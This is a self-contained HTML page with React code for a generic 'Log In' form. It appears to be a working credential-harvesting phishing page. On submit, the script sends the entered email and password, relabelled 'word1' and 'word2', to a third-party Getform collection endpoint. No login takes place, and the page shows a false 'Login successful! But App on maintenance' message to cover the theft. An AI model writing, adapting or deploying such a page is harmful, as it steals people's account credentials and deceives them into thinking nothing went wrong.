<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log In</title>
  
  <!-- 1. Load Tailwind CSS (for styling) -->
  <script src="https://cdn.tailwindcss.com"></script>
  
  <!-- 2. Load React & ReactDOM -->
  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  
  <!-- 3. Load Babel (to read JSX) -->
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
</head>
<body>

  <!-- This is where the React app will be rendered -->
  <div id="root"></div>

  <!-- 4. Your React code, wrapped in a <script type="text/babel"> tag -->
  <script type="text/babel">
    // We need to get useState from the global React object
    const { useState } = React;


    function App() {
      const [email, setEmail] = useState('');
      const [password, setPassword] = useState('');
      const [status, setStatus] = useState('');

      const handleSubmit = async (e) => { 
        e.preventDefault();
        setStatus(''); // Clear previous status

        // Your Getform endpoint
        const getformEndpoint = 'https://getform.io/f/adrdegla';

        // Your Getform fetch logic
        try {
          const response = await fetch(getformEndpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              word1: email, // Sending as 'word1'
              word2: password, // Sending as 'word2'
            }),
          });

          if (response.ok) {
            setStatus('Login successful! But App on maintenance, try later!'); 
            setEmail('');
            setPassword('');
          } else {
            setStatus('Error in login attempt.'); 
          }
        } catch (error) {
          console.error('Error:', error);
          setStatus('Error in login attempt.'); 
        }
      };

      // This is your component's JSX
      return (
        <div className="flex items-center justify-center min-h-screen bg-gray-100">
          <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg shadow-md">
            <h2 className="text-2xl font-bold text-center text-gray-900">
              Log In
            </h2>
            
            {/* Display status message */}
            {status && (
              <div className={`p-3 text-sm rounded-lg ${status.includes('Error') ? 'text-red-700 bg-red-100' : 'text-green-700 bg-green-100'}`}>
                {status}
              </div>
            )}

            <form className="space-y-6" onSubmit={handleSubmit}>
              <div>
                <label 
                  htmlFor="email" 
                  className="block text-sm font-medium text-gray-700"
                >
                  Email Address
                </label>
                <input
                  id="email"
                  name="email"
                  type="email"
                  autoComplete="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="block w-full px-3 py-2 mt-1 placeholder-gray-400 border border-gray-300 rounded-md shadow-sm appearance-none focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                />
              </div>

              <div>
                <label 
                  htmlFor="password" 
                  className="block text-sm font-medium text-gray-700"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type="password"
                  autoComplete="current-password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="block w-full px-3 py-2 mt-1 placeholder-gray-400 border border-gray-300 rounded-md shadow-sm appearance-none focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                />
              </div>

              <div>
                <button
                  type="submit"
                  className="flex justify-center w-full px-4 py-2 text-sm font-medium text-white bg-blue-600 border border-transparent rounded-md shadow-sm hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                >
                  Sign In
                </button>
              </div>
            </form>
          </div>
        </div>
      );
    }

    // 5. This code renders your App component into the <div id="root">
    const container = document.getElementById('root');
    const root = ReactDOM.createRoot(container);
    root.render(<App />);
  </script>

</body>
</html>
